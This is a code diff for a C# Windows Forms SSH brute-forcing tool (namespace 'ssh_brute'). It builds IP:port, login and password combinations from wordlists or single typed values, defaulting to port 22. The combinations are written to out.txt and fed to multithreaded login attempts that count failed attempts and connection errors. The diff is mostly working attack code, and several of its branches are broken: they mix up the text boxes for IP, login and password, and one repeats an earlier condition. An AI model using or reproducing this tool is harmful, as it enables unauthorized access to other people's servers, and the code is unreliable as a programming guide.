@@ -19,6 +19,12 @@ namespace ssh_brute
         public static string _passwords;
         public static string _ips;
         public static string _combos;
+        public static bool just_login = false;
+        public static bool just_password = false;
+        public static bool just_ips = false;
+        public static string login;
+        public static string password;
+        public static string ips;
         public static List<string> threads = new List<string>();
         public static Thread thread0_start;
         public static Thread thread1_start;
@@ -40,7 +46,7 @@ namespace ssh_brute
                 openFileDialog.Title = "Logins load";
                 openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                 openFileDialog.ShowDialog();
-                label1.Text = openFileDialog.FileName;
+                textBox1.Text = openFileDialog.FileName;
                 _logins = openFileDialog.FileName;
             }
         }
@@ -52,7 +58,7 @@ namespace ssh_brute
                 openFileDialog.Title = "Passwords load";
                 openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                 openFileDialog.ShowDialog();
-                label2.Text = openFileDialog.FileName;
+                textBox2.Text = openFileDialog.FileName;
                 _passwords = openFileDialog.FileName;
             }
         }
@@ -64,27 +70,98 @@ namespace ssh_brute
                 openFileDialog.Title = "IPS load";
                 openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                 openFileDialog.ShowDialog();
-                label3.Text = openFileDialog.FileName;
+                textBox3.Text = openFileDialog.FileName;
                 _ips = openFileDialog.FileName;
             }
         }
 
         public void combos_make()
         {
+            just_login = false;
+            just_password = false;
+            just_ips = false;
             listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add("Working")));
             int counter = 0;
-            var logins_lines = File.ReadAllLines(_logins);
-            var passwds_lines = File.ReadAllLines(_passwords);
-            var ips_lines = File.ReadAllLines(_ips);
-            for (int i = 0; i < ips_lines.Length; i++)
+            string[] logins_lines = { "" };
+            string[] passwds_lines = { "" };
+            string[] ips_lines = { "" };
+            if (textBox1.Text.Contains('\\')) { logins_lines = File.ReadAllLines(_logins); }
+            else { login = textBox1.Text; just_login = true; }
+
+            if (textBox2.Text.Contains('\\')) { passwds_lines = File.ReadAllLines(_passwords); }
+            else { password = textBox2.Text; just_password = true; }
+
+            if (textBox3.Text.Contains('\\')) { ips_lines = File.ReadAllLines(_ips); }
+            else { ips = textBox3.Text; just_ips = true; }
+
+            if (just_login == true & just_password == true & just_ips == true)
             {
-                for (int j = 0; j< logins_lines.Length; j++)
+                string thread_name = "Auth000";
+                string combo = "";
+                if (ips.Contains(':'))
+                {
+                    combo = $"{ips}|{login}:{password}";
+                }
+                else
+                {
+                    combo = $"{ips}:22|{login}:{password}";
+                }
+                threads.Add(thread_name);
+                MessageBox.Show(combo);
+                thread1_start = new Thread(() => authorize(combo, thread_name));
+                thread1_start.Start();
+                Thread.CurrentThread.Abort();
+            }
+
+            if (just_login == false & just_password == false & just_ips == false)
+            {
+                for (int i = 0; i < ips_lines.Length; i++)
+                {
+                    for (int j = 0; j < logins_lines.Length; j++)
+                    {
+                        for (int k = 0; k < passwds_lines.Length; k++)
+                        {
+                            if (ips_lines[i].Contains(':'))
+                            {
+                                string combo = ips_lines[i] + "|" + logins_lines[j] + ":" + passwds_lines[k];
+                                using (StreamWriter sw = File.AppendText("out.txt"))
+                                {
+                                    sw.WriteLine(combo);
+                                    counter++;
+                                    if (counter % 10000 == 0)
+                                    {
+                                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                                    }
+                                }
+                            }
+                            else
+                            {
+                                string combo = ips_lines[i] + ":22|" + logins_lines[j] + ":" + passwds_lines[k];
+                                using (StreamWriter sw = File.AppendText("out.txt"))
+                                {
+                                    sw.WriteLine(combo);
+                                    counter++;
+                                    if (counter % 10000 == 0)
+                                    {
+                                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                MessageBox.Show($"Ready -> {counter}");
+            }
+
+            if (just_login == true & just_password == true & just_ips == false)
+            {
+                for (int j = 0; j < logins_lines.Length; j++)
                 {
                     for (int k = 0; k < passwds_lines.Length; k++)
                     {
-                        if (ips_lines[i].Contains(':'))
+                        if (textBox2.Text.Contains(':'))
                         {
-                            string combo = ips_lines[i] + "|" + logins_lines[j] + ":" + passwds_lines[k];
+                            string combo = textBox2.Text + "|" + logins_lines[j] + ":" + textBox1.Text;
                             using (StreamWriter sw = File.AppendText("out.txt"))
                             {
                                 sw.WriteLine(combo);
@@ -97,7 +174,7 @@ namespace ssh_brute
                         }
                         else
                         {
-                            string combo = ips_lines[i] + ":22|" + logins_lines[j] + ":" + passwds_lines[k];
+                            string combo = textBox2.Text + ":22|" + logins_lines[j] + ":" + passwds_lines[k];
                             using (StreamWriter sw = File.AppendText("out.txt"))
                             {
                                 sw.WriteLine(combo);
@@ -111,11 +188,222 @@ namespace ssh_brute
                     }
                 }
             }
-            MessageBox.Show($"Ready -> {counter}");
+
+            if (just_login == true & just_password == false & just_ips == true)
+            {
+                for (int k = 0; k < passwds_lines.Length; k++)
+                {
+                    if (textBox2.Text.Contains(':'))
+                    {
+                        string combo = textBox2.Text + "|" + textBox1.Text + ":" + passwds_lines[k];
+                        using (StreamWriter sw = File.AppendText("out.txt"))
+                        {
+                            sw.WriteLine(combo);
+                            counter++;
+                            if (counter % 10000 == 0)
+                            {
+                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                            }
+                        }
+                    }
+                    else
+                    {
+                        string combo = textBox2.Text + ":22|" + textBox1.Text + ":" + passwds_lines[k];
+                        using (StreamWriter sw = File.AppendText("out.txt"))
+                        {
+                            sw.WriteLine(combo);
+                            counter++;
+                            if (counter % 10000 == 0)
+                            {
+                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (just_login == true & just_password == false & just_ips == false)
+            {
+                for (int i = 0; i < ips_lines.Length; i++)
+                {
+                    for (int k = 0; k < passwds_lines.Length; k++)
+                    {
+                        if (ips_lines[i].Contains(':'))
+                        {
+                            string combo = ips_lines[i] + "|" + textBox1.Text + ":" + passwds_lines[k];
+                            using (StreamWriter sw = File.AppendText("out.txt"))
+                            {
+                                sw.WriteLine(combo);
+                                counter++;
+                                if (counter % 10000 == 0)
+                                {
+                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                                }
+                            }
+                        }
+                        else
+                        {
+                            string combo = ips_lines[i] + ":22|" + textBox1.Text + ":" + passwds_lines[k];
+                            using (StreamWriter sw = File.AppendText("out.txt"))
+                            {
+                                sw.WriteLine(combo);
+                                counter++;
+                                if (counter % 10000 == 0)
+                                {
+                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (just_login == false & just_password == true & just_ips == true)
+            {
+                for (int j = 0; j < logins_lines.Length; j++)
+                {
+                    if (textBox2.Text.Contains(':'))
+                    {
+                        string combo = textBox2.Text + "|" + logins_lines[j] + ":" + textBox1.Text;
+                        using (StreamWriter sw = File.AppendText("out.txt"))
+                        {
+                            sw.WriteLine(combo);
+                            counter++;
+                            if (counter % 10000 == 0)
+                            {
+                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                            }
+                        }
+                    }
+                    else
+                    {
+                        string combo = textBox2.Text + ":22|" + logins_lines[j] + ":" + textBox1.Text;
+                        using (StreamWriter sw = File.AppendText("out.txt"))
+                        {
+                            sw.WriteLine(combo);
+                            counter++;
+                            if (counter % 10000 == 0)
+                            {
+                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (just_login == false & just_password == false & just_ips == true)
+            {
+                for (int j = 0; j < logins_lines.Length; j++)
+                {
+                    for (int k = 0; k < passwds_lines.Length; k++)
+                    {
+                        if (textBox2.Text.Contains(':'))
+                        {
+                            string combo = textBox2.Text + "|" + logins_lines[j] + ":" + passwds_lines[k];
+                            using (StreamWriter sw = File.AppendText("out.txt"))
+                            {
+                                sw.WriteLine(combo);
+                                counter++;
+                                if (counter % 10000 == 0)
+                                {
+                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                                }
+                            }
+                        }
+                        else
+                        {
+                            string combo = textBox2.Text + ":22|" + logins_lines[j] + ":" + passwds_lines[k];
+                            using (StreamWriter sw = File.AppendText("out.txt"))
+                            {
+                                sw.WriteLine(combo);
+                                counter++;
+                                if (counter % 10000 == 0)
+                                {
+                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (just_login == true & just_password == true & just_ips == false)
+            {
+                for (int i = 0; i < ips_lines.Length; i++)
+                {
+                    if (ips_lines[i].Contains(':'))
+                    {
+                        string combo = ips_lines[i] + "|" + textBox1.Text + ":" + textBox1.Text;
+                        using (StreamWriter sw = File.AppendText("out.txt"))
+                        {
+                            sw.WriteLine(combo);
+                            counter++;
+                            if (counter % 10000 == 0)
+                            {
+                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                            }
+                        }
+                    }
+                    else
+                    {
+                        string combo = ips_lines[i] + ":22|" + textBox1.Text + ":" + textBox1.Text;
+                        using (StreamWriter sw = File.AppendText("out.txt"))
+                        {
+                            sw.WriteLine(combo);
+                            counter++;
+                            if (counter % 10000 == 0)
+                            {
+                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (just_login == false & just_password == true & just_ips == false)
+            {
+                for (int i = 0; i < ips_lines.Length; i++)
+                {
+                    for (int j = 0; j < logins_lines.Length; j++)
+                    {
+                        if (ips_lines[i].Contains(':'))
+                        {
+                            string combo = ips_lines[i] + "|" + logins_lines[j] + ":" + textBox1.Text;
+                            using (StreamWriter sw = File.AppendText("out.txt"))
+                            {
+                                sw.WriteLine(combo);
+                                counter++;
+                                if (counter % 10000 == 0)
+                                {
+                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                                }
+                            }
+                        }
+                        else
+                        {
+                            string combo = ips_lines[i] + ":22|" + logins_lines[j] + ":" + textBox1.Text;
+                            using (StreamWriter sw = File.AppendText("out.txt"))
+                            {
+                                sw.WriteLine(combo);
+                                counter++;
+                                if (counter % 10000 == 0)
+                                {
+                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            MessageBox.Show($"Ready - {counter}");
         }
 
         private void button4_Click(object sender, EventArgs e)
         {
+            just_login = false;
+            just_password = false;
+            just_ips = false; 
             thread0_start = new Thread(combos_make);
             thread0_start.Start();
         }
@@ -177,7 +465,11 @@ namespace ssh_brute
                                 label5.Invoke((MethodInvoker)(() => label5.Text = $"Bads: {bads}"));
                             }
                         }
-                        catch { }
+                        catch 
+                        {
+                            bads++;
+                            label5.Invoke((MethodInvoker)(() => label5.Text = $"Bads: {bads}"));
+                        }
                     }
                 }
             } catch { error_connection++; label8.Invoke((MethodInvoker)(() => label8.Text = $"Connection Error: {error_connection}")); }
@@ -198,7 +490,7 @@ namespace ssh_brute
                         while (true)
                         {
                             label6.Invoke((MethodInvoker)(() => label6.Text = $"Active threads: {threads.Count}"));
-                            if (threads.Count >= int.Parse(textBox1.Text)) { Thread.Sleep(10); }
+                            if (threads.Count >= int.Parse(textBox11.Text)) { Thread.Sleep(10); }
                             else
                             {
                                 string thread_name = $"Thread-{i}";
